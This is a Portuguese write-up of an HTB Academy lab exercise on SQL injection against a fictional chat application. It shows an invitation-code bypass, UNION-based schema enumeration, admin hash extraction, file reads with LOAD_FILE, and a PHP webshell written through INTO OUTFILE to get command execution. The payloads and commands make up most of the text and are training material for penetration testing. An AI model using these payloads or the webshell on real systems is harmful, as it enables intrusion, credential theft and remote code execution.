# SQL Injection Fundamentals — Skills Assessment | HTB Academy

**Cenário:** Chattr GmbH (aplicação fictícia para fins educacionais) <br>
**Módulo:** SQL Injection Fundamentals — Hack The Box Academy <br>
**Tipo de teste:** Black-box, escopo restrito a vulnerabilidades de SQL Injection <br>
**Autor:** Paulo <br>
**Status:** ✅ Flag capturada

> ⚠️ **Disclaimer:** Este write-up documenta a exploração de um ambiente de laboratório controlado da HTB Academy, com fins exclusivamente educacionais. Nenhum sistema real foi alvo deste teste.

<img src="https://i.imgur.com/yuaH3iA.png">

---

## 📋 Sumário

- [Objetivos do Assessment](#objetivos-do-assessment)
- [1. Reconhecimento Inicial](#1-reconhecimento-inicial)
- [2. Authentication Bypass via SQLi](#2-authentication-bypass-via-sqli)
- [3. Descoberta da Segunda Injeção](#3-descoberta-da-segunda-injeção)
- [4. Enumeração da Base de Dados](#4-enumeração-da-base-de-dados)
- [5. Extração de Credenciais](#5-extração-de-credenciais)
- [6. Leitura Arbitrária de Arquivos (LOAD_FILE)](#6-leitura-arbitrária-de-arquivos-load_file)
- [7. Fingerprinting do Web Server](#7-fingerprinting-do-web-server)
- [8. Descoberta do Web Root](#8-descoberta-do-web-root)
- [9. Remote Code Execution](#9-remote-code-execution)
- [10. Captura da Flag](#10-captura-da-flag)
- [Resumo Técnico](#resumo-técnico)
- [Ferramentas Utilizadas](#ferramentas-utilizadas)
- [Lições Aprendidas](#lições-aprendidas)

---

## Objetivos do Assessment

| # | Objetivo | Status |
|---|----------|--------|
| 1 | Identificar ponto vulnerável a SQL Injection | ✅ |
| 2 | Realizar Authentication Bypass | ✅ |
| 3 | Enumerar databases, tabelas e colunas | ✅ |
| 4 | Extrair hashes de credenciais | ✅ |
| 5 | Ler arquivos do sistema operacional via DB | ✅ |
| 6 | Descobrir o diretório raiz da aplicação | ✅ |
| 7 | Obter Remote Code Execution (RCE) | ✅ |
| 8 | Capturar a flag final | ✅ |

---

## 1. Reconhecimento Inicial

A primeira etapa consistiu em mapear as superfícies de entrada da aplicação. A página de **login** foi testada exaustivamente (error-based, UNION-based e time-based), mas não apresentou comportamento vulnerável.

A exploração manual seguiu para as demais funcionalidades, levando à página de **cadastro de usuário**.

<img src="https://i.imgur.com/QVnVmrP.png">

---

## 2. Authentication Bypass via SQLi

Interceptando a requisição de registro com o **Burp Suite**, cada parâmetro foi testado individualmente até a identificação do campo vulnerável: `invitationCode`.

**Payload:**
```sql
' OR '1'='1
```

**Requisição completa:**
```http
POST /api/register.php

username=Teste
password=Teste1234!@
repeatPassword=Teste1234!@
invitationCode=' OR '1'='1
```

O payload neutralizou a validação do código de convite, permitindo a criação de uma conta válida sem possuir um invitation code legítimo. Login realizado com sucesso na sequência.

<img src="https://i.imgur.com/CwMHgbu.png">

---

## 3. Descoberta da Segunda Injeção

Após autenticado, a aplicação expõe um sistema de mensagens com duas superfícies relevantes: **envio** e **pesquisa de mensagens**.

O campo de pesquisa reagiu de forma anômala a um apóstrofo simples:

```sql
'
```

A quebra na exibição dos resultados indicou interferência direta na query SQL subjacente.

---

## 4. Enumeração da Base de Dados

### 4.1 Número de colunas (ORDER BY)

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -
```

➡️ A query trabalha com **4 colunas**.

### 4.2 Colunas refletidas (UNION SELECT)

```sql
admin') UNION SELECT 1,2,3,4-- -
```

➡️ As colunas **3 e 4** são renderizadas na página.

<img src="https://i.imgur.com/6BmuM6O.png">

### 4.3 Banco de dados atual

```sql
admin') UNION SELECT 1,2,database(),4-- -
```

**Resultado:** `chattr`

### 4.4 Tabelas do schema

```sql
admin') UNION SELECT 1,2,table_name,4
FROM information_schema.tables
WHERE table_schema='chattr'-- -
```

**Resultado:**
```text
Users
InvitationCodes
Messages
```

### 4.5 Colunas da tabela Users

```sql
admin') UNION SELECT 1,2,column_name,4
FROM information_schema.columns
WHERE table_name='Users'-- -
```

**Resultado:**
```text
UserID
Username
Password
InvitationCode
AccountCreated
```

---

## 5. Extração de Credenciais

```sql
admin') UNION SELECT 1,2,Username,Password
FROM Users-- -
```

**Hash recuperado (admin):**
```text
$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
```

<img src="https://i.imgur.com/Z7wNksW.png">

---

## 6. Leitura Arbitrária de Arquivos (LOAD_FILE)

### 6.1 Verificação de privilégios

```sql
admin') UNION SELECT 1,2,privilege_type,4
FROM information_schema.user_privileges-- -
```

➡️ Privilégio **FILE** confirmado, habilitando o uso de `LOAD_FILE()`.

### 6.2 Validação da leitura

```sql
admin') UNION SELECT 1,2,LOAD_FILE('/etc/passwd'),4-- -
```

Leitura confirmada com sucesso, validando a primitiva de **arbitrary file read** via banco de dados.

<img src="https://i.imgur.com/zWQdz0P.png">

---

## 7. Fingerprinting do Web Server

```sql
LOAD_FILE('/etc/apache2/apache2.conf')   -- sem sucesso
LOAD_FILE('/etc/nginx/nginx.conf')       -- sucesso
```

O conteúdo do `nginx.conf` revelou:
```nginx
include /etc/nginx/sites-enabled/*;
```

### Descoberta do Virtual Host (SQLi + Fuzzing)

Foi montada uma requisição com o ponto de fuzzing:

```sql
LOAD_FILE('/etc/nginx/sites-enabled/FUZZ')
```

E o fuzzing foi conduzido com **ffuf**, usando a requisição interceptada como base:

```bash
ffuf \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -request payload.req
```

Após filtrar ruído por tamanho de resposta e status code:

```bash
ffuf \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -request payload.req \
  -fs 5368 \
  -mc 200
```

➡️ Virtual host identificado: **`default`**

<img src="https://i.imgur.com/GbMkIXW.png">
<img src="https://i.imgur.com/Htq8ZAt.png">

---

## 8. Descoberta do Web Root

```sql
admin') UNION SELECT 1,2,
LOAD_FILE('/etc/nginx/sites-enabled/default'),
4-- -
```

**Trecho relevante do arquivo:**
```nginx
server {
    root /var/www/chattr-prod;
}
```

➡️ Web root: **`/var/www/chattr-prod`**

---

## 9. Remote Code Execution

Com o privilégio `FILE` e o webroot mapeado, foi possível escrever um webshell PHP diretamente via SQLi:

```sql
admin') UNION SELECT
"",
'<?php system($_REQUEST[0]); ?>',
"",
""
INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -
```

**Acesso ao webshell:**
```text
/shell.php?0=id
```

**Resultado:**
```text
uid=33(www-data)
gid=33(www-data)
```

➡️ **RCE confirmado.**

<img src="https://i.imgur.com/lKBbo3x.png">

---

## 10. Captura da Flag

```text
/shell.php?0=ls%20/
```

```text
flag_876a4c.txt
```

```text
/shell.php?0=cat%20/flag_876a4c.txt
```

✅ **Flag capturada com sucesso.**

<img src="https://i.imgur.com/vFmFOOW.png">

---

## Resumo Técnico

| Etapa | Técnica | Resultado |
|---|---|---|
| Registro | Auth Bypass via SQLi (`' OR '1'='1`) | Conta criada sem invitation code |
| Pesquisa de mensagens | UNION-based SQLi | Enumeração completa do schema |
| Extração de dados | `information_schema` | Tabelas, colunas e hash do admin |
| Leitura de arquivos | `LOAD_FILE()` | `/etc/passwd`, `nginx.conf`, vhost config |
| Reconhecimento externo | SQLi + ffuf | Virtual host e web root identificados |
| Execução de código | `INTO OUTFILE` | Webshell PHP → RCE como `www-data` |

---

## Ferramentas Utilizadas

- **Burp Suite** — interceptação e manipulação de requisições
- **ffuf** — fuzzing de virtual hosts combinado com SQLi
- **MySQL/MariaDB syntax** — UNION-based, error-based e enumeração via `information_schema`
- **SecLists** — wordlists para fuzzing

---

## Lições Aprendidas

- A ausência de vulnerabilidade no ponto de entrada mais "óbvio" (login) reforça a importância de mapear **toda** a superfície de ataque antes de descartar uma classe de vulnerabilidade.
- O privilégio `FILE` no MySQL transforma uma SQLi clássica em um vetor direto para **leitura e escrita arbitrária de arquivos**, e consequentemente em RCE.
- Combinar SQLi com ferramentas externas de fuzzing (ffuf) para enumerar configurações do servidor web foi o diferencial técnico deste assessment, sendo uma técnica que vai além do "manual padrão" de SQL Injection.

---

📌 *Write-up produzido como parte da trilha de certificação **HTB CPTS (Certified Penetration Testing Specialist)**.*
